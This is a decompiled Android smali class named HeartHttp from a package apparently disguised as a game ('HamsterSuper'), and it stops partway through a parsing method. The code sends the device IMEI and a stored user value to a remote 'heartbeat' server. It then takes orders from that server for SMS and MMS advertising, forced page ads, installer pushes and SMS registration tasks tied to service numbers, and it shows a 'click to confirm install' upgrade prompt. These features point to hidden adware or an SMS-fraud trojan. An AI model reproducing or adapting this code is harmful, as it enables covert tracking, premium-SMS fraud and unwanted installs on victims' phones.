.class public LDaemon/Protocol/HeartHttp;
.super Ljava/lang/Object;
.source "HeartHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static final TAG:Ljava/lang/String; = "HeartHttp"

.field private static final url:Ljava/lang/String;


# instance fields
.field private address:Ljava/lang/String;

.field private adwidget:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "LDaemon/Protocol/AdBase;",
            ">;"
        }
    .end annotation
.end field

.field private filename:Ljava/lang/String;

.field private heart_open:Z

.field private key_priority:Ljava/util/Map;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Map",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field private key_type:Ljava/util/Map;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Map",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field private monthly:I

.field private reduce:Z

.field private timetype:Ljava/lang/String;

.field private update_info:Ljava/lang/String;

.field private update_title:Ljava/lang/String;

.field private updatemode:I

.field private upgrade:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 24
    new-instance v0, Ljava/lang/StringBuilder;

    sget-object v1, LDaemon/Action/Action;->host:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "agent/heartbeatmody?"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, LDaemon/Protocol/HeartHttp;->url:Ljava/lang/String;

    .line 20
    return-void
.end method

.method public constructor <init>()V
    .locals 6

    .prologue
    const/4 v5, 0x2

    const/4 v4, 0x1

    const/4 v3, 0x0

    const-string v1, ""

    .line 45
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 26
    iput-boolean v3, p0, LDaemon/Protocol/HeartHttp;->reduce:Z

    .line 28
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    .line 30
    const/4 v0, 0x0

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->timetype:Ljava/lang/String;

    .line 32
    iput v4, p0, LDaemon/Protocol/HeartHttp;->monthly:I

    .line 34
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    .line 35
    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->key_priority:Ljava/util/Map;

    .line 37
    iput v3, p0, LDaemon/Protocol/HeartHttp;->updatemode:I

    .line 38
    iput-boolean v3, p0, LDaemon/Protocol/HeartHttp;->upgrade:Z

    .line 39
    iput-boolean v4, p0, LDaemon/Protocol/HeartHttp;->heart_open:Z

    .line 40
    const-string v0, "\u7248\u672c\u5347\u7ea7"

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->update_title:Ljava/lang/String;

    .line 41
    const-string v0, "\u70b9\u51fb\u786e\u8ba4\u5b89\u88c5!"

    iput-object v0, p0, LDaemon/Protocol/HeartHttp;->update_info:Ljava/lang/String;

    .line 42
    const-string v0, ""

    iput-object v1, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    .line 43
    const-string v0, ""

    iput-object v1, p0, LDaemon/Protocol/HeartHttp;->filename:Ljava/lang/String;

    .line 47
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "SMSAdvertising"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 48
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "MMSAdvertising"

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 49
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "PageAdvertising"

    const/4 v2, 0x4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 50
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "ForcePageAdvertising"

    const/4 v2, 0x6

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 51
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "MMAdvertising"

    const/4 v2, 0x3

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 52
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "ForceMMAdvertising"

    const/4 v2, 0x5

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 53
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "InstallerAdvertising"

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 54
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    const-string v1, "SMSRegisterTask"

    const/16 v2, 0x8

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 56
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_priority:Ljava/util/Map;

    const-string v1, "NORMAL"

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 57
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_priority:Ljava/util/Map;

    const-string v1, "EMERGENCY"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 58
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_priority:Ljava/util/Map;

    const-string v1, "EXPRESS"

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 59
    return-void
.end method

.method private static print(Ljava/lang/String;)V
    .locals 1
    .param p0, "msg"    # Ljava/lang/String;

    .prologue
    .line 331
    sget-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 332
    const-string v0, "HeartHttp"

    invoke-static {v0, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 333
    :cond_0
    return-void
.end method


# virtual methods
.method public doWidget()V
    .locals 25

    .prologue
    .line 121
    invoke-static {}, LDaemon/Service/HeartConnecter;->getalltime()I

    move-result v15

    .line 123
    .local v15, "date":I
    const/16 v17, 0x0

    .local v17, "i":I
    :goto_0
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    move-object v2, v0

    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v2

    move/from16 v0, v17

    move v1, v2

    if-lt v0, v1, :cond_0

    .line 158
    const-string v2, "adwidget clear"

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 159
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    move-object v2, v0

    invoke-virtual {v2}, Ljava/util/ArrayList;->clear()V

    .line 160
    return-void

    .line 126
    :cond_0
    :try_start_0
    const-string v2, "doWidget setEvent"

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 127
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPacknum(I)I

    move-result v3

    .line 128
    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetVersion(I)I

    move-result v4

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetName(I)Ljava/lang/String;

    move-result-object v5

    .line 129
    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetInfo(I)Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetType(I)I

    move-result v7

    .line 130
    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPushNum(I)Ljava/lang/String;

    move-result-object v8

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetUrl(I)Ljava/lang/String;

    move-result-object v9

    .line 131
    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPushTime(I)I

    move-result v10

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetFileName(I)Ljava/lang/String;

    move-result-object v11

    .line 132
    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPriority(I)I

    move-result v12

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetStrategy(I)I

    move-result v13

    .line 127
    invoke-virtual/range {v2 .. v13}, LDaemon/Action/Action;->setEvent(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;ILjava/lang/String;II)V

    .line 133
    const-string v2, "doWidget Generate_events"

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 134
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->action:LDaemon/Action/Action;

    .line 135
    const/4 v3, 0x3

    sget v4, LDaemon/Action/Action;->even_mode:I

    .line 134
    invoke-virtual {v2, v3, v4}, LDaemon/Action/Action;->Generate_events(II)I

    move-result v24

    .line 136
    .local v24, "type":I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "doWidget END:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    move/from16 v1, v17

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPacknum(I)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 137
    add-int/lit8 v18, v17, 0x1

    .local v18, "j":I
    :goto_1
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    move-object v2, v0

    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v2

    move/from16 v0, v18

    move v1, v2

    if-lt v0, v1, :cond_1

    .line 123
    .end local v18    # "j":I
    .end local v24    # "type":I
    :goto_2
    add-int/lit8 v17, v17, 0x1

    goto/16 :goto_0

    .line 138
    .restart local v18    # "j":I
    .restart local v24    # "type":I
    :cond_1
    move-object/from16 v0, p0

    move/from16 v1, v18

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPushTime(I)I

    move-result v2

    if-ne v2, v15, :cond_2

    .line 139
    move-object/from16 v0, p0

    move/from16 v1, v18

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetStrategy(I)I

    move-result v2

    if-lez v2, :cond_2

    .line 140
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "show_time change id:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    move/from16 v1, v18

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetPacknum(I)I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 141
    move-object/from16 v0, p0

    move/from16 v1, v18

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->getWidgetStrategy(I)I

    move-result v19

    .line 142
    .local v19, "mStrategy":I
    mul-int/lit8 v2, v19, 0x3c

    mul-int/lit8 v2, v2, 0x3c

    mul-int/lit16 v14, v2, 0x3e8

    .line 143
    .local v14, "add_time":I
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v20

    .line 144
    .local v20, "new_time":J
    int-to-long v2, v14

    add-long v20, v20, v2

    .line 145
    new-instance v23, Ljava/text/SimpleDateFormat;

    .line 146
    const-string v2, "yyyyMMddHH"

    .line 145
    move-object/from16 v0, v23

    move-object v1, v2

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 148
    .local v23, "simpleFormat":Ljava/text/SimpleDateFormat;
    invoke-static/range {v20 .. v21}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    move-object/from16 v0, v23

    move-object v1, v2

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 147
    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v22

    .line 149
    .local v22, "push_time":I
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    move-object v2, v0

    move-object v0, v2

    move/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, LDaemon/Protocol/AdBase;

    move/from16 v0, v22

    move-object v1, v2

    iput v0, v1, LDaemon/Protocol/AdBase;->show_time:I

    .line 150
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "show_time change:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v2

    move/from16 v1, v22

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 137
    .end local v14    # "add_time":I
    .end local v19    # "mStrategy":I
    .end local v20    # "new_time":J
    .end local v22    # "push_time":I
    .end local v23    # "simpleFormat":Ljava/text/SimpleDateFormat;
    :cond_2
    add-int/lit8 v18, v18, 0x1

    goto/16 :goto_1

    .line 154
    .end local v18    # "j":I
    .end local v24    # "type":I
    :catch_0
    move-exception v2

    move-object/from16 v16, v2

    .line 155
    .local v16, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "doWidget e:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v16 .. v16}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    goto/16 :goto_2
.end method

.method public getHttpUrl()Ljava/lang/String;
    .locals 3

    .prologue
    .line 166
    const-string v0, ""

    .line 167
    .local v0, "URL":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "&imei="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    invoke-virtual {v2}, LDaemon/Protocol/RegHttp;->getImei()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&md5pwd="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 168
    sget-object v2, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    invoke-virtual {v2}, LDaemon/Protocol/RegHttp;->getuser_value()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&monthly="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget v2, p0, LDaemon/Protocol/HeartHttp;->monthly:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 169
    const-string v2, "&version="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, LDaemon/Action/Action;->version:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&channel="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, LDaemon/Action/Action;->channe:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 170
    const-string v2, "&product="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, LDaemon/Action/Action;->product:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&protocol_version="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 171
    sget v2, LDaemon/Action/Action;->protocol_version:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 167
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 173
    new-instance v1, Ljava/lang/StringBuilder;

    sget-object v2, LDaemon/Protocol/HeartHttp;->url:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public getTimeType()Ljava/lang/String;
    .locals 1

    .prologue
    .line 70
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->timetype:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetFileName(I)Ljava/lang/String;
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 98
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v0, p0, LDaemon/Protocol/AdBase;->filename:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetInfo(I)Ljava/lang/String;
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 82
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v0, p0, LDaemon/Protocol/AdBase;->content:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetName(I)Ljava/lang/String;
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 78
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v0, p0, LDaemon/Protocol/AdBase;->title:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetPacknum(I)I
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 74
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget v0, p0, LDaemon/Protocol/AdBase;->id:I

    return v0
.end method

.method public getWidgetPriority(I)I
    .locals 2
    .param p1, "location"    # I

    .prologue
    .line 112
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_priority:Ljava/util/Map;

    iget-object v1, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v1, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v1, p0, LDaemon/Protocol/AdBase;->priority:Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    return v0
.end method

.method public getWidgetPushNum(I)Ljava/lang/String;
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 108
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v0, p0, LDaemon/Protocol/AdBase;->sp_number:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetPushTime(I)I
    .locals 2
    .param p1, "location"    # I

    .prologue
    .line 102
    invoke-virtual {p0, p1}, LDaemon/Protocol/HeartHttp;->getWidgetPriority(I)I

    move-result v0

    const/4 v1, 0x2

    if-ne v0, v1, :cond_0

    .line 103
    const/4 v0, 0x1

    .line 104
    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    :goto_0
    return v0

    .restart local p0    # "this":LDaemon/Protocol/HeartHttp;
    :cond_0
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget v0, p0, LDaemon/Protocol/AdBase;->show_time:I

    goto :goto_0
.end method

.method public getWidgetStrategy(I)I
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 116
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget v0, p0, LDaemon/Protocol/AdBase;->strategy:I

    return v0
.end method

.method public getWidgetType(I)I
    .locals 2
    .param p1, "location"    # I

    .prologue
    .line 86
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->key_type:Ljava/util/Map;

    iget-object v1, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v1, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v1, p0, LDaemon/Protocol/AdBase;->type:Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    return v0
.end method

.method public getWidgetUrl(I)Ljava/lang/String;
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 90
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget-object v0, p0, LDaemon/Protocol/AdBase;->url:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetVersion(I)I
    .locals 1
    .param p1, "location"    # I

    .prologue
    .line 94
    iget-object v0, p0, LDaemon/Protocol/HeartHttp;->adwidget:Ljava/util/ArrayList;

    invoke-virtual {v0, p1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":LDaemon/Protocol/HeartHttp;
    check-cast p0, LDaemon/Protocol/AdBase;

    iget v0, p0, LDaemon/Protocol/AdBase;->version:I

    return v0
.end method

.method public getYeah()I
    .locals 1

    .prologue
    .line 62
    iget v0, p0, LDaemon/Protocol/HeartHttp;->monthly:I

    return v0
.end method

.method public parsePackage(Ljava/lang/String;)LDaemon/Service/ServerConnecter$httpState;
    .locals 9
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    const-string v5, "name"

    .line 178
    const-string v5, "httpparsePackage state:start"

    invoke-static {v5}, LDaemon/Protocol/HeartHttp;->print(Ljava/lang/String;)V

    .line 182
    :try_start_0
    const-string v5, "address"

    invoke-static {p1, v5}, LDaemon/Base/Tools;->parseString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, LDaemon/Protocol/HeartHttp;->address:Ljava/lang/String;

    .line 183
    const-string v5, "name"

